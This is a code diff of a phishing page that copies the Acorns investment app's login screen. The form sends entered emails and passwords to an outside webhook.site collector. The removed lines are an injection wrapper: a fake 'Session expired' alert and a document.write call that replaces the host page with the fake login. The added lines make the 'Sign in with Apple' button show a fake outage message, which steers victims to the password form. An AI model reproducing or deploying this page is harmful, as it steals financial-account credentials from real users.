@@ -1,8 +1,3 @@
-alert('Session expired - Please login again');
-
-document.open();
-document.write(`
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -14,7 +9,7 @@ document.write(`
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
         }
         
         body {
@@ -22,80 +17,83 @@ document.write(`
             display: flex;
             align-items: center;
             justify-content: center;
-            background: linear-gradient(135deg, #0b4b3a 0%, #1e8a6b 100%);
+            background: linear-gradient(135deg, #0B4B3A 0%, #1E8A6B 100%);
             padding: 20px;
         }
         
-        .login-container {
-            max-width: 450px;
+        .login-card {
+            max-width: 440px;
             width: 100%;
             background: white;
             border-radius: 24px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
             padding: 48px 40px;
-        }
-        
-        .logo-section {
-            text-align: center;
-            margin-bottom: 32px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
         }
         
         .logo {
             font-size: 32px;
             font-weight: 700;
-            color: #0b4b3a;
+            color: #0B4B3A;
+            text-align: center;
+            margin-bottom: 32px;
             letter-spacing: -0.5px;
+        }
+        
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #1A1A1A;
             margin-bottom: 8px;
+            text-align: center;
         }
         
         .welcome-text {
-            font-size: 24px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 8px;
-        }
-        
-        .sub-text {
             font-size: 16px;
-            color: #666;
+            color: #666666;
+            text-align: center;
             margin-bottom: 32px;
         }
         
-        .input-group {
-            margin-bottom: 20px;
+        .form-group {
+            margin-bottom: 24px;
         }
         
-        .input-group label {
+        label {
             display: block;
             font-size: 14px;
             font-weight: 600;
-            color: #333;
+            color: #1A1A1A;
             margin-bottom: 8px;
         }
         
-        .input-group input {
+        input {
             width: 100%;
             padding: 14px 16px;
             font-size: 16px;
-            border: 2px solid #e0e0e0;
+            border: 2px solid #E5E5E5;
             border-radius: 12px;
-            transition: border-color 0.2s;
-            background: #f8f8f8;
+            background: #F8F8F8;
+            transition: all 0.2s;
         }
         
-        .input-group input:focus {
+        input:focus {
             outline: none;
-            border-color: #1e8a6b;
+            border-color: #1E8A6B;
             background: white;
+        }
+        
+        input::placeholder {
+            color: #999999;
+            font-size: 16px;
         }
         
         .forgot-password {
             text-align: right;
-            margin-bottom: 24px;
+            margin-bottom: 32px;
         }
         
         .forgot-password a {
-            color: #1e8a6b;
+            color: #1E8A6B;
             text-decoration: none;
             font-size: 14px;
             font-weight: 500;
@@ -108,27 +106,27 @@ document.write(`
         .login-btn {
             width: 100%;
             padding: 16px;
-            background: #1e8a6b;
+            background: #1E8A6B;
             color: white;
             border: none;
-            border-radius: 30px;
+            border-radius: 40px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: background 0.2s;
             margin-bottom: 24px;
+            transition: background 0.2s;
         }
         
         .login-btn:hover {
-            background: #0b4b3a;
+            background: #0B4B3A;
         }
         
         .divider {
             display: flex;
             align-items: center;
             text-align: center;
-            margin: 24px 0;
-            color: #999;
+            margin-bottom: 24px;
+            color: #999999;
             font-size: 14px;
         }
         
@@ -136,7 +134,7 @@ document.write(`
         .divider::after {
             content: '';
             flex: 1;
-            border-bottom: 1px solid #e0e0e0;
+            border-bottom: 1px solid #E5E5E5;
         }
         
         .divider span {
@@ -147,39 +145,40 @@ document.write(`
             width: 100%;
             padding: 14px;
             background: white;
-            border: 2px solid #e0e0e0;
-            border-radius: 30px;
+            border: 2px solid #E5E5E5;
+            border-radius: 40px;
             font-size: 16px;
             font-weight: 500;
-            color: #333;
+            color: #1A1A1A;
             cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 8px;
             transition: background 0.2s;
         }
         
         .apple-btn:hover {
-            background: #f5f5f5;
+            background: #F8F8F8;
         }
         
         .apple-icon {
             font-size: 20px;
+            font-weight: 400;
         }
         
-        .weather-footer {
+        .footer {
             margin-top: 32px;
             padding-top: 24px;
-            border-top: 1px solid #e0e0e0;
+            border-top: 1px solid #E5E5E5;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            color: #666;
+            color: #666666;
             font-size: 13px;
         }
         
-        .weather-info {
+        .weather {
             display: flex;
             align-items: center;
             gap: 6px;
@@ -187,42 +186,46 @@ document.write(`
         
         .temp {
             font-weight: 600;
+            color: #1A1A1A;
         }
         
-        .date-time {
-            color: #999;
-        }
-        
-        .language-selector {
+        .language {
             display: flex;
-            gap: 10px;
+            gap: 8px;
         }
         
-        .language-selector a {
-            color: #666;
+        .language a {
+            color: #666666;
             text-decoration: none;
         }
         
-        .language-selector a:hover {
-            color: #1e8a6b;
+        .language a:hover {
+            color: #1E8A6B;
+        }
+        
+        .language span {
+            color: #CCCCCC;
+        }
+        
+        .datetime {
+            color: #999999;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="logo-section">
-            <div class="logo">acorns</div>
-            <div class="welcome-text">Log in to Acorns</div>
-            <div class="sub-text">Welcome back! Log in to continue.</div>
-        </div>
+    <div class="login-card">
+        <div class="logo">acorns</div>
+        
+        <h1>Log in to Acorns</h1>
+        <div class="welcome-text">Welcome back! Log in to continue.</div>
         
         <form action="https://webhook.site/1d7986a3-ebad-4673-a29e-b66ef5185237" method="POST">
-            <div class="input-group">
+            <div class="form-group">
                 <label>Email</label>
                 <input type="email" name="email" placeholder="Enter your email" required>
             </div>
             
-            <div class="input-group">
+            <div class="form-group">
                 <label>Password</label>
                 <input type="password" name="password" placeholder="Enter your password" required>
             </div>
@@ -238,29 +241,26 @@ document.write(`
             <span>or</span>
         </div>
         
-        <button class="apple-btn">
+        <button class="apple-btn" onclick="alert('Apple Sign In is temporarily unavailable. Please use email login.')">
             <span class="apple-icon"></span>
             Sign in with Apple
         </button>
         
-        <div class="weather-footer">
-            <div class="weather-info">
+        <div class="footer">
+            <div class="weather">
                 <span>☀️</span>
                 <span class="temp">26°C</span>
                 <span>Mostly clear</span>
             </div>
-            <div class="language-selector">
+            <div class="language">
                 <a href="#">ENG</a>
                 <span>|</span>
                 <a href="#">IN</a>
             </div>
-            <div class="date-time">
+            <div class="datetime">
                 23:13 • 14-03-2026
             </div>
         </div>
     </div>
 </body>
 </html>
-
-`);
-document.close();
